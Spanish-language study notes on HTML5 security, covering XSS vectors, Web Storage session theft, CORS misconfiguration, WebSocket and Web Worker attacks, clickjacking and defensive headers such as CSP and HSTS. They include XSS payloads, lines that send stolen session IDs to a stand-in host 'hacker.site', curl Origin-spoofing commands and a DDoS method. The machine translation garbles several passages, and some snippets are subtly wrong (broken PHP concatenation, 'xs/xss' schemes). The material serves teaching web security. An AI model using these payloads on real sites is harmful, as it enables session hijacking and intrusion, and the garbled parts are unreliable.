# HTLM5

## Intro

No necesitamos analizar todo el HTML5 RFC y sus características relacionadas; Sin embargo, lo que vamos a explorar en esta sección Recap es las principales características que son interesantes desde una perspectiva de seguridad.

### Semántica

Enriquecimiento de la semántica que los devs web pueden dar a sus aplicaciones. Estos incluyen nuevos elementos de medios, tipos de formas, atributos y muchos otros. Desde el punto de vista de la seguridad, estos se convierten en nuevos vectores de ataque y formas de eludir las medidas de seguridad.

### Form Elements

El elemento keygen es uno de los nuevos Elementos de la Forma. Se introdujo para generar un lado de cliente de la pieza clave. El atributo más interesante que soporta es autofoco. Esto es útil en _descupación de XSS sin interacción del usuario_.

Example:

```js
<form action="#" method "GET">
  Encryption: <keygen name="security" autofocus onfocus="alert(1);">
  <input type="submit">
</form>
```

### Media Elements

```js
# Both <video> and <audio> are commonly ysed to evade XSS filters. In addition, <source>, <track> and <embed> are also useful due to the fact that they support the 'src' attribute

# Example:

<embed src="http://hacker.site/evil.swf">
<embed src="javascript:alert(1)">
```

### Semantic / Structural Elements

Hay muchos otros elementos introducidos para mejorar el semántico y la estructura de una página, tales como:

```js
<article>
<figure>
<footer>
<header>
<main>
<mark>
<nav>
<progress>
<section>
<summary>
<time>
```

> Todos ellos apoyan a Global y Event Attributes, tanto antiguos como nuevos.

### Attributes

Hay una enorme lista de nuevos eventos y algunos ejemplos interesantes son:

```js
onhashchange
onformchange
onscroll
onresize
...
```

Ejemplo:

```js
<body onhashchange="alert(1)">
  <a href="#"> Click me</a>
```

### Offile & Storage

A real world example is _TiddlyWiki_: http://tiddlywiki.com/

* Algunas de las principales características, relacionadas con esta evolución son **Application Cache** y **Web Storage** (alias Client-Side Storage o Offile storage)

## Web Storage -- Attack Scenarios

Los escenarios de ataque pueden variar de **Sestubiando de la tensión, rastreo de usuarios, revelación de datos confidenciales**, así como una nueva forma de **tremos vectores de ataque**.

### Session Hijacking

Si un dev elige almacenar identificaciones de sesión mediante el uso de **sessionStorage** en lugar de cookies, todavía es posible realizar el secuestro de sesiones aprovechando un fallo XSS.

```js
new Image().src="http://hacker.site/SID?"+escape(sessionStorage.getItem('sessionID'));
// usually was document.cookie
```

Las soluciones de almacenamiento en la Web no aplican mecanismos de seguridad para mitigar el riesgo de acceso malicioso a la información almacenada (véase HttpOnly)

### Offline Web Application -- Attack Scenarios

* Con las aplicaciones Web Offline, el problema de seguridad más crítico es **Cache Poisoning**.
* Las aplicaciones de archivo también pueden almacenar recursos SSL y el directorio raíz de un sitio web.

### Device Access

Una característica introducida por las especificaciones HTML5 es **Geolocation API**

→ http://www.w3.org/TR/geolocation-API/

> Esta es una manera de proporcionar acceso scripted para identificar las posiciones de los usuarios basadas en coordenadas GPS (lat y largas)

### Geolocation -- Attack Scenarios

Este acceso API no solo se puede utilizar para \*\* seguimiento de usuario\*\*, físico y cruzado, sino también para \*\* desgarrador anonimato\*\*.

## Fullscreen Mode -- Attack Scenario

Otra API que permite ver un solo elemento (imábalas, vídeos, etc.) en modo totalmente decren.

→ https://dvcs.w3.org/hg/fullscreen/raw-file/tip/Overview.html

* Esta API se puede utilizar para **Phishing Attacks**.
* Ejemplo, enviando una página de phishing en modo de pantalla completa y cargando un sitio web de víctimas falsos en el fondo con una imagen que simula la cabecera del navegador, una barra de direcciones, etc.

## Performance, Integration & Connectivity

Muchas características nuevas, tales como:

* **Drag and Drop, HML edición y trabajadores**( Web y Shared) También se realizan mejoras en las comunicaciones, con características como:
* **WebSocket** y **XMLHttpRequest2**.

### Attack Scenarios

**Interactive XSS**, con Drag and Drop, to **Remove Shell, scaninging de puerto** y **web-based botnets** explotando las nuevas características de comunicación como _WebSocket_.

* También es posible manipular la pila **historia** con métodos para añadir y eliminar ubicaciones, permitiendo así \*\* manipulación de la historia\*\* ataques.

Sec POV, las características más importantes introducidas son:

```js
Content Security Policy
Cross-Origin Resource Sharing
Cross-Document Messaging 
strengthening of iframe with the Sandboxed attribute.

- http://www.w3.org/TR/CSP/
- http://www.w3.org/TR/cors/
- https://html.spec.whatwg.org/multipage/web-messaging.html
- http://www.w3.org/TR/html5/embedded-content-0.html#attr-iframe-sandbox
```

## Exploiting HTML5

Que pueden afectar a las tecnologías más extendidas introducidas por HTML5

### CORS Attack Scenarios

Las mismas restricciones de origen comenzaron a ser más restrictivas que útiles. Con el fin de relajar el SOP, se ha introducido una nueva especificación: Inter-Origin Resource Sharing.

→ http://www.w3.org/TR/cors/

Usa un conjunto de cabeceras HTTP.

→ http://www.w3.org/TR/cors/#syntax

> Estos permiten tanto al servidor como al navegador comunicarse en relación con las solicitudes que están o no permitidas.

#### Universal Allow

Las primeras cabeceras de CORS son **Access-Control-Allow-Origin**, que indica si un recurso puede ser compartido o no.

Esto se basa en que devuelve el valor de la cabecera de la solicitud de Origen, \*, o nula en la respuesta:

```js
Access-Control-Allow-Origin = "Access-Control-Allow-Origin" ":" origin-list-or-null | "*"
```

#### Allow by Wildcar Value \*

Generalmente este no es un comportamiento requerido, sino más bien una cuestión de pereza del implementador. Esta es una de las configuraciones erróneas más comunes con las cabezas de CORS.

Cómo abusar?

```js
- If XSS is found on the page served with 'Access-Control-Allow-Origin *', it can be used to infect or impersonate users.
- Tricking users to access a controlled website and making a COR query to their internal resources in order to read the responses.
- Use the users as a proxy to exploit vulnerabilities, therefore leveraging the fact that the HTTP Referrer header is often not logged.
```

#### Universal Allow

In CORS, el **Acceso-Control-Allow-Credentials** indica que la solicitud puede incluir credenciales de usuario. http://www.w3.org/TR/cors/#user-credentials

#### Allow by Server-side

Permitir el COR de todos los dominios con credenciales incluidos:

```php
<?php
header('Access-Control-Allow-Origin: '+$_SERVER['HTTP_ORIGIN']);
header('Access-Control-Allow-Credentials: true');
```

Por diseño, esta implementación permite CSRF.

> Cualquier origen podrá leer las fichas anti-CSRF desde la página, consintando así que cualquier dominio en internet se haga pasar por los usuarios de la aplicación web.

### Weak Access Control

Las especificaciones CORS proporcionan una cabecera de solicitud llamada **Orrín**. Indica de dónde se origina el COR o Preflight Solicitud.

* La cabecera puede ser falsificado creando peticiones fuera de los navegadores. Por ejemplo, uno puede utilizar un proxy o usar una herramienta como cURL, Wget, etc.

#### Check Origin Example

Supongamos que una víctima.site soporta CORS y, no sólo revela información sensible a los orígenes amigables, sino que también revela información simple a todos.

Utilizando CURL es posible eludir el control de acceso estableciendo la cabecera de Origen al valor permitido: friend.site.

Al hacerlo, es posible leer la información sensible enviada:

```bash
curl http://victim.site/html5/CORAaccessContro.php
# normal output

curl --header 'Origin: http://hacker.site' http://victim.site/...
# normal output

curl --header 'Origin: http://friend.site' http://victim.site/...
# sensitive information found
```

### Intranet Scanning

También es posible abusar de COR para realizar el escaneo de intranet basado en el tiempo.

* Enviar XHR a una dirección IP arbritraria o a los nombres de dominio y, dependiendo del tiempo de respuesta, establecer el siheter un host está arriba o un puerto específico está abierto.

#### JS-Recon

Es una herramienta de reconconnacimiento de la red Javascript con HTML5

→ https://web.archive.org/web/20120313125925/http:/www.andlabs.org/tools/jsrecon/jsrecon.html

Qué características como COR y Web Sockets con el fin de realizar tanto la red como el escaneo de puerto desde el navegador.

> También útil para adivinar a los usuarios direcciones IP privadas.

### Remote Web Shell

Si se encuentra una falla XSS en una aplicación que soporta CORS, un atacante puede secuestrar la sesión de la víctima, estableciendo un canal de comunicación entre el navegador de las víctimas y el attcker.

#### The Shell of the Future

→ https://web.archive.org/web/20150223205517/http:/www.andlabs.org/tools/sotf/sotf.html

Es un manejador de concha web inversa, se puede utilizar para secuestrar sesiones donde JavaScript se puede inyectar usando XSS o a través de la barra de direcciones de los navegadores. Hace uso de HTML5 Cross Origin Requests y puede eludir medidas de secuestro anti-sesión como cookies Http-Only y encuadernación IP de identificación de...

## Storage Attacks Scenarios

→ https://tools.ietf.org/html/rfc6265#section-6.1

### Web Storage

Su primera especificación estable HTML5 que regula dos mecanismos bien conocidos: Almacenamiento de sesiones y almacenamiento local.

Las implementaciones son similares a las cookies y también se conocen como almacenamiento de valor clave y almacenamiento DOM. Cualquier cosa se puede convertir en una cadena o serializado y almacenado:

```js
window.(localStorage|sessionStorage).setItem('name','Joao');
#         DOM properties                       Key     Value
```

* http://www.w3.org/TR/webstorage/#security-storage

> El principal problema con esta tecnología es que los desarrolladores no son conscientes de las preocupaciones de seguridad presentadas en esta especificación, que informa claramente de los riesgos de seguridad que esta característica puede introducir.

### Session Hijacking

En el caso de un ataque XSS, Web Storage es una propiedad del objeto Ventana; por lo tanto, es accesible a través del DOM y, de manera similar a las galletas, se puede comprometer.

La explotación es similar a la utilizada Para las cookies, pero la única diferencia está en la API utilizada para recuperar los valores:

```js
<script> new Image.src = "http://hacker.site/C.php?cc=" +escape(sessionStorage.getItem('sessionID'));
</script>
```

* Las cookies HTTP tienen atributos, como **HTTPOnly**, que se introdujeron para detener los fenómenos de secuestro de la sesión.
* Esta medida de seguridad, sin embargo, falta por completo para las tecnologías WebStorage, por lo que es completamente inapropiado Para almacenar tanto los identificadores de sesión como la información sensible

### Cross-Directory Attacks

Otra diferencia importante es que, a diferencia de las cookies HTTP, no hay ninguna característica para restringir el acceso por nombre, haciendo que el contenido de Almacenamiento Web esté disponible en todo el origen. Esto también puede introducir ataques cruzados.

* Esto es típico para varias redes sociales como facebook, o universidades.

Ejemplo:

* Si se encuentra un fallo XSS en la universidad path uni.edu/\~professorX, es posible leer todos los datos almacenados en todos los directorios disponibles en el dominio universitario uni.edu.

### Using Tracking and Confidential Data Disclosure

Es posible realizar User Traking si los sitios web utilizan objetos de almacenamiento web para almacenar información sobre los comportamientos de los usuarios en lugar de las cookies HTTP.

### IndexedDB

Cuando se trabaja con datos estructurados, no proporciona un mecanismo eficiente para buscar sobre los valores.

Para hacer frente a estas limitaciones, dos opciones que HTML5 introdujo:

```js
- IndexedDB - http://www.w3.org/TR/IndexedDB/
- Web SQL Databse - http://www.w3.org/TR/webdatabase/
// the second was deprectated in 2010
```

* webSQL base de datos es un sistema relacional de acceso a la base de datos, mientras que IndexedDB es un sistema de tabla indexado.
* API de base de datos indexada es una API HTML5 introducida Para búsquedas de alto rendimiento en el almacenamiento del lado del cliente. La idea es que este almacenamiento tenga cantidades significativas de datos estructurados e indexados, dando así a los desarrolladores un mecanismo de consulta eficiente del lado del cliente.
* Es una tecnología transaccional, sin embargo, no relacional. El sistema de base de datos guarda pares de valor clave en la estafa de objetosres and allows searching data by using indexes also known as keys.
* Los riesgos primarios están relacionados con \*\* fugas de información\*\* y \*\* falsificación de información\*\*
* IndexedDB sigue la Política de Same-Origin, pero limita el uso a HTTP y HTTPS en todo el navegador excepto Internet Explorer.

Esto también permite los protocolos **ms-wwa** y **ms-wwa-web** Para sus aplicaciones en el nuevo formato de interfaz de usuario de Windows.

## Web Messaging Attack Scenarios

→ http://www.w3.org/TR/webmessaging/

Esto también se conoce como Mensaje de Documentos cruzados o post-metssage (nombre API)

Las comunicaciones entre los iframes emboferados\*\* y el sitio web de alojamiento son ahora posibles.

### DOM XSS

Esto ocurre si los datos postMessage recibidos se utilizan sin validación. Tal como **innerHTML, write, etc**:

```js
...
// Say Hello
var hello = document.getElementById("hellobox");
hello.innerHTML = "Hello "+e.data;
// HTMLElement Sink           User controlled values
```

### Origin Issue

El Web Messaging Protocl permite la presencia del campo de cabecera de Origen

La cabecera de Origen no es obligatoria, pero puede ayudar a reducir la superficie de ataque limitando la interacción con orígenes de confianza y reduciendo la probabilidad de un **Client-side DoS**:

```js
if (e.origin != 'http://trusted.site'){
// Origin not allowed
return;
}
```

Como hemos visto con CORS, incluso si no se puede hacer a través del navegador, la cabecera de origen se puede falsifiar creando peticiones fuera del navegador.

## Web Sockets Attack Scenarios

→ http://tools.ietf.org/html/rfc6455

→ http://www.w3.org/TR/websockets/

HTML5 Web Sockets puede proporcionar un 500:1 o --dependiendo del tamaño de las cabeceras HTTP - incluso una reducción de 1000:1 en el tráfico innecesario de cabecera HTTP y 3:1 reducción de latencia.

Eso no es sólo una mejora incremental; eso es un salto revolucionario.

> Si somos capaces de ejecutar el código de JavaScript dentro del navegador de la víctima, es posible establecer una conexión de Socket Web y realizar nuestras operaciones maliciosas.

### Data validation

Uno de los problemas más simples de validación de datos para encontrar puede ser XSS y mientras lo buscamos, también podríamos encontrar otros tipos de Inyecciones con respecto al lado del cliente y el lado del servidor.

### MiTM

WebSocket La norma del Protocolo define dos esquemas Para conexiones de enchufados web:

```js
xs  = unencrypted
xss = encrypted
```

Si la implementación utiliza el canal sin cifrado, tenemos un problema MiTM por el cual, cualquiera en la red puede ver y manipular el tráfico.

### Remote Shell

Si somos capaces de ejecutar el código JavaScript en el navegador de la víctima, explotando un defecto XSS o engañando a la víctima para que visite un sitio web malicioso, podríamos establecer convenientemente una conexión completa de Socket Web y, como resultado, tener una concha remota activa hasta que la ventana/tab esté cerrada.

### Network Reconnaissance

Bonitas herramientas para probar ambos escenarios JS-Recon

→ https://web.archive.org/web/20120313125925/http:/www.andlabs.org/tools/jsrecon/jsrecon.html

## Web Workers Attack Scenarios

→ http://www.w3.org/TR/workers/

Los trabajadores web son la solución, introducida por HTML5, para permitir operaciones similares a los rosados dentro de los navegadores web. permite a la mayoría de los navegador modernos ejecutar Javascript en el fondo.

Métodos como **setTimeout, setInterval o incluso XMLHttpRequest**, proporcionaron una solución válida para lograr el paralelismo mediante el uso de mensajería similar a un hilo.

Dos tipos:

```js
Dedicated Web Workers: http://www.w3.org/TR/workers/#dedicated-workers-and-the-worker-interface
Shared Web Workers: http://www.w3.org/TR/workers/#shared-workers-and-the-sharedworker-interface
```

* A un trabajador dedicado sólo se puede acceder a través del script que lo creó, mientras que el compartido puede ser accedido por cualquier script del mismo dominio.
* No introdujo nuevas amenazas, sino que aumentó el rendimiento y la viabilidad del ataque.

### Browser-Based Botnet

Podemos ejecutar el código Javascript en todos los navegadores que soportan las características que utiliza el bot. Esto también incluye cualquier sistema operativo que pueda ejecutar un navegador, incluso en televisores, consola de juegos, etc.

Dos etapas:

```js
- 1. Infect the victims: XSS, email spam, social engineering...
- 2. Manage Persistence: the malicious code will work until the victim browser is closed.
```

A veces, implementar un juego puede ayudarte a mantener a la víctima en la página maliciosa. Si el juego es a la vez interactivo y especialmente adictivo, el usuario puede permanecer en línea todo el día.

Con un HTML5 Botnet, algunos de los ataques de possibel que se pueden realizar son:

```js
Email Spam
Distributed Password Cracking
DDoS Attacks
Phishing
Data Mining
Intranet Reconnaissance
```

### Distributed Password Cracking

* Ravan

→ http://web.archive.org/web/20160315031218/http:/www.andlabs.org/tools/ravan.html

> Un sistema basado en WebWorkers para realizar la grieta de contraseña de _MD5_, _SHA1_, _SHA256_, _SHA512_ hashes.

### WebWorkers + CORS - DDoS Attacks

Añadiendo CORS podríamos generar un gran número de solicitudes de GET/POST a un sitio web remoto. Estáríamos usando solicitudes COR para realizar un ataque DDoS.

* No nos importa si la respuesta está bloqueada o equivocada, nos importa enviar tantas solicitudes como sea posible.

To bypass la limitación CORS, añadir parámetros de facke en la cuerda de consulta. Forzará al navegador a transformar cada solicitud, identiándola así como única:

```js
http://victim.site/dossable.php?search=X
x = use random values here
```

## Security Measures

### Security Headers: X-XSS-Protection

Para protegerse de los ataques XSS Reflected

### Security Headers: X-Frame-Options

Evitar el clic

* Esta cabecera introdujo una manera Para que el servidor instruya al navegador en wheter para mostrar el contenido transmitido en el marco de otras páginas web.

Syntax:

```js
X-Frame-Options: value

# DENY = the page cannot be displayed in a frame, regardless of the site attempting to do so.
# SAMEORIGIN = The page can only be displayed in a frame on the same origin as the page itself.
# ALLOW-FROM URI = The page can only be displayed in a frame on the specific origin.
```

### Security Headers: Strict-Transport-Security (HSTS)

→ http://tools.ietf.org/html/rfc6797

Permite a un servidor declararse accesible sólo a través de conexiones seguras. También permite que los usuarios puedan dirigir a sus agentes de usuario para interactuar con los sitios dados únicamente en conexiones seguras.

Para habilitar este mecanismo, se requiere el encabezado de respuesta **Etrict-Transport-Security**. (no es compatible con todos los proveedores.

→ http://caniuse.com/#feat=stricttransportsecurity

Syntax:

```js
Strict-Transport-Security: max-age=<delta-seconds>; includeSubDomains

# One year in cache is 'max-age=31536000' (Optional)
# While to remove or 'not cache' is max-age=0
```

### Security Headers: X-Content-Type-Options

Para indicar un recurso específico, el servidor web utiliza la cabecera de respuesta Content-Type que contiene un tipo MIME estándar( texto/html, image/png, etc) con algunos parámetros opcionales (configuración de caracteres)

→ attack scenarios - http://blog.fox-it.com/2012/05/08/mime-sniffing-feature-or-vulnerability/

El más común es **Contenido de olfaación XSS**

→ http://www.adambarth.com/papers/2009/barth-caballero-song.pdf

* Esta cabecera instruye al navegador a **no adivinar** el tipo de contenido del recurso y la confianza de la cabecera de Content-Type.

Syntax:

```js
X-Content-Type-Options: nosniff
// only works on IE and Chrome
```

### Security Headers: Content Security Policy (CSP)

Es un mecanismo de defensa que puede reducir significativamente el impacto del riesgo de una amplia clase de vulnerabilidades de inyección de contenido. Estos incluyen **XSS** y \*\* **UI Redressing** en navegadores modernos.

Cabecistas adoptados:

```js
X-Content-Security-Policy and X-WebKit-CSP
```

CSP utiliza una colección de directivas para definir un conjunto específico de fuentes de contenido de confianza en la lista blanca

→ http://www.w3.org/TR/CSP/#directives

Lo más común es script-src = http://www.w3.org/TR/CSP/#script-src:

```
 Content-Security-Policy: script-src 'self' https://other.web.site

//                   Directive Name      Values
// 1 Defines which scripts the protected resource can execute
// 2 the allowed sources of scripts
```

Las directivas funcionan en modo default-perseo. Esto simplemente significa que si una directiva específica no tiene una política definida, entonces es igual a "\*"; por lo tanto, cada fuente es una fuente válida.

La directiva **default-src** se aplicará a todas las directivas no especificadas:

```js
Content-Security-Policy: default-src 'self'
```

Con CSP, también es posible negar recursos. Por ejemplo, si la aplicación web no necesita plugins o para ser enmarcada, entonces la política puede enriquecerse como sigue:

```js
Content-Security-Policy: default-src https://my.web.site;
object-src 'none'; frame-src 'none'
// 'none' returns an empty set For the allowed sources
```

CSP specification: http://www.w3.org/TR/CSP/

Define las siguientes directivas de la lista:

```js
default-src
script-src
object-src
style-src
img-src
media-src
frame-src
font-src
connect-src
report-uri // reporting feature
sandbox    // optional
```

Hay cuatro palabras clave que también están permitidas:

```js
none - no sources
self - current origin, but not its subdomains
unsafe-inline - allows inline JavaScript and CSS
unsafe-eval - allows text-to-JavaScript sinks like 'eval, alert, setTimeout...'

// These keywords must be used with single-quotes, otherwise they refer to server named none, self, etc
```

Mecanismo de violaciones de informes:

```js
Content-Security-Policy: default-src 'self'; report-uri /csp_report;
// once a violation is detected, the browser will perform a POST request to the path specified, sending a JSON object, similar to the one on the next slide.
```

Ejemplo:

```
{
  "csp-report": {
    "document-uri":"http://my.web.site/page.html",
    "referrer":"http://hacker.site/",
    "blocked-uri":"https://hacker.site/xss_test.js",
    "violated-directive":"script-src 'self'",
    "original-policy":"script-src 'self'; report-uri http://my.web.site/csp_report"
  }
}
```

#### CSP Playground

Para probar las opciones CSP

```
http://www.cspplayground.com/
```

## UI Redressing - The x-Jacking Art

Una categoría de ataques que tienen como objetivo cambiar elementos visuales en una interfaz de usuario con el fin de ocultar actividades maliciosas.

Ejemplos como:

```js
- Overlaying a visible button with an invisible one
- Changing the cursos position 
- Manipulating other elements in the user interface
- Also known as ClickJacking, LikeJacking, StrokeJacking, FileJacking and others
```

### ClickJacking

Este ataque utiliza un iframe anidado de un sitio web de destino y un poco de magia CSS.

Un botón de sumisión o lo que el ataque elija desencadenar una acción:

```js
For example: **find willie**, when clicked it triggers the attack
```

### LikeJacking

→ http://nakedsecurity.sophos.com/2010/05/31/facebook-likejacking-worm/

* El objetivo son las redes sociales y sus características.
* A él le gusta se percibe como popularidad y calidad hoy en día, así que hay maneras de comprar likes para dar al público esta percepción equivocada

### StrokeJacking

→ http://seclists.org/fulldisclosure/2010/Mar/232

Una técnica para secuestrar pulsaciones de teclado, es la prueba de que la redirección de UI no se trata sólo de secuestrar clics.

Example:

```js
http://blog.andlabs.org/2010/04/stroke-triggered-xss-and-strokejacking_06.html
```

## New Attack Vectors in HTML5

Drag-and-Drop:

* With html5 this drag-and-drop mechanims ha sido transformado en algo nativamente soportado por todos los navegadores basados en escritorio.

### Text Field Injection

La primera técnica permite al atacante-control descontrolar datos en campos de texto ocultos / formas en diferentes orígenes.

→ http://blog.kotowicz.net/2011/03/exploiting-unexploitable-xss-with.html

### Content Extraction

Permítanos extraer contenido de áreas a las que no podemos acceder. (zonas restringidas). En este escenario, debemos engañar a la víctima para que arrastre sus datos privados a áreas bajo nuestro control.

* Para engañar a la víctima para que podamos extraer contenido de la página web dirigida, debemos saber qué extraer y dónde se encuentra.

Si el secreto es parte de una URL, es un elemento de anclaje HTML o una imagen, el arrastre es fácil. Porque los elementos se convertirán en una URL serializada.

* Es difícil cuando el contenido no es arrastrable como el contenido textual. Así que tenemos que engañar a la víctima para que seleccione primero antes de arrastrar.

Podríamos utilizar la fuente de visión: para cargar el código fuente HTML en un iframe.

Ejemplo:

```js
<iframe src="view-source:http://victim.site/secretInfo/"></iframe>
```

> Sin embargo, esta técnica sólo funciona en Firefox, sin la NoScript add-on.
